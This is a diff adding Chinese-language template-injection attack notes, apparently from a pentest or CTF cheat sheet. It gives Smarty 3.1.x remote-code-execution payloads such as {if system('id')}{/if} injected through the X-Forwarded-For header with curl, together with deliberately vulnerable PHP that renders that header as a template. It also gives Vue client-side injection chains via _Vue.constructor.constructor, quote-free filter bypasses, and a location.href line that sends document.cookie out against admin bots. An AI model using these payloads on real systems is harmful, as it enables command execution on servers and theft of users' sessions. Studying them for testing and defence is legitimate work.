@@ -224,6 +224,102 @@ Java 模板引擎可以通过实例化 Java Runtime 类直接执行命令：
 {include file='php://filter/convert.base64-encode/resource=/flag'}
 ```
 
+版本与语法分叉（实测 Smarty 3.1.30）：
+
+| 手法 | 3.1.x 行为 |
+|---|---|
+| `{$smarty.version}` | 版本指纹，直接吐 `3.1.30` |
+| `{php}...{/php}` | 被禁：`Smarty Compiler: ... {php}{/php} tags not allowed. Use SmartyBC` |
+| `{if system('id')}{/if}` | ✅ 可用。`{if}` 编译成 **原生 PHP 表达式**，函数调用直通，无需 SmartyBC |
+| `{$smarty.template_object->smarty->fetch('string:{system("id")}')}` | ✅ 可用（嵌套渲染路径） |
+
+因此遇到 3.1.x 不要因为 `{php}` 报错就判定不可利用，优先试 `{if <php_call>}{/if}`。
+
+注入位置也常不在 URL：**任何被 `display('string:'.$x)` 吃掉的用户可控值都算入参**。
+实测向量是 `X-Forwarded-For`：
+
+```php
+// /xff/index.php
+$real_ip = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['HTTP_CLIENT_IP'] ?? $_SERVER['REMOTE_ADDR'];
+$smarty->display('string:'.$real_ip);      // 头即模板
+```
+
+```bash
+curl -H "X-Forwarded-For: {7*7}"             http://target/xff/   # -> 49, <real_ip>
+curl -H "X-Forwarded-For: {\$smarty.version}" http://target/xff/   # -> 3.1.30, <real_ip>
+curl -H "X-Forwarded-For: {if system(id)}{/if}" http://target/xff/ # -> uid=82(www-data)
+```
+
+注意模板输出常带后缀（本例服务端在末尾又拼了真实 IP），payload 无需闭合引号即可执行，
+但命令内的引号要与外层模板语法冲突性一起考虑：命令里出现单引号时改用 `{if system("cmd")}{/if}`。
+
+### 客户端模板注入 (CSTI) — Vue / Angular / Alpine
+
+服务端把用户数据塞进前端模板字符串时同理，且**转义函数往往只覆盖 HTML 特殊字符，不覆盖 `{{ }}`**。
+
+Vue 3 的可行 payload **取决于构建方式**：
+
+| 构建 | 编译产物 | 可用句柄 |
+|---|---|---|
+| 全局构建 `vue.global.js`（运行时编译，`with(_ctx)`） | `function render(_ctx,_cache){ with(_ctx){ const {...helpers} = _Vue; return ... } }` | **`_Vue` + 编译器实际用到的 helper** |
+| SFC 预编译 / 模块构建 | 带 `import` 与 `_ctx.` 前缀，无 `with` | 需走 `__vccOpts` / 组件内部属性 |
+
+#### 精确规则：解构列表 = 编译器生成的代码用到哪些 helper
+
+不要记"只有 `_Vue` 可用"，规则是**编译器只解构它自己生成的代码里出现的 helper**：
+
+```js
+// 前导码（vue.global.js 的 genFunctionPreamble，实测 3.5.24）
+const _Vue = Vue                      // ← 一定存在，外层 const
+return function render(_ctx, _cache) { with (_ctx) { ... } }
+```
+
+- 模板是**纯文本插值** `Hello {{7*7}}` → 只解构 `toDisplayString`
+  → 表达式里写 `_openBlock` 报 `_openBlock is not defined`。
+- 模板**带元素** `<div>{{7*7}}</div>` → 多解构 `openBlock`、`createElementBlock`
+  → 此时经典 payload `{{_openBlock.constructor(...)()}}` **可用**。
+
+换句话说，**经典 payload 失效通常是因为注入点落在纯文本上下文**（例如 payload 先经过
+一层 markdown 渲染，`{{...}}` 外面没剩标签），而不是"全局构建不支持"。
+
+```js
+{{_openBlock.constructor('alert(1)')()}}          // ❌ 纯文本模板下 ReferenceError
+{{_Vue.constructor.constructor('alert(1)')()}}    // ✅ 任何情形都可用
+```
+
+`_Vue.constructor === Function` 的链：`Vue` 是函数 → `_Vue.constructor` 是 `Function`
+→ `Function.constructor` 还是 `Function` → 等价 `new Function(code)`。
+
+#### 验证方法（先本地、后线上）
+
+用同版本 `vue.global.js` 把编译产物打出来，直接看作用域：
+
+```js
+const ctx = vm.createContext({ document: {createElement: () => ({style:{}, setAttribute(){}, querySelector:()=>null})}, console, window:{}, globalThis:{} });
+vm.runInContext(fs.readFileSync('vue.global.js','utf8'), ctx);
+console.log(ctx.Vue.compile(tpl).toString());     // ← 生成代码原文
+```
+
+判读要点：看 `const { ... } = _Vue` 那一行里有没有你要用的标识符。
+再用 Playwright + Chromium 打开带 payload 的 URL，用 `page.title` / `#app.innerHTML`
+和 `pageerror` 判断是否执行、报什么错。**`pageerror` 是定位"为什么没执行"的关键信息**，
+只在本地可见，线上只能看到最终 HTML。
+
+**过滤器约束要先读源码再写 payload**。以「只做 `escapeHtml` 的 markdown 渲染器」为例：
+
+- `& < > " '` 被转义 → 不能出现引号
+- `_(.*?)_` → `<em>`、`\*(.*?)\*` → `<strong>` → 不要让 payload 里出现成对 `_` 或 `*`
+- 反引号 → `<code>`、`^#\s` → 标题、`[..](..)` → 链接
+
+无引号构造字符串：
+
+```js
+{{_Vue.constructor.constructor(String.fromCharCode(100,111,99,117,109,101,110,116))()}}
+```
+
+外带：`location.href = String.fromCharCode(<url codes>) + encodeURIComponent(document.cookie)`
+（导航型外带不受 CORS 限制，适合无回显的 admin bot 场景）。
+
 ### ERB (Ruby)
 
 ```erb
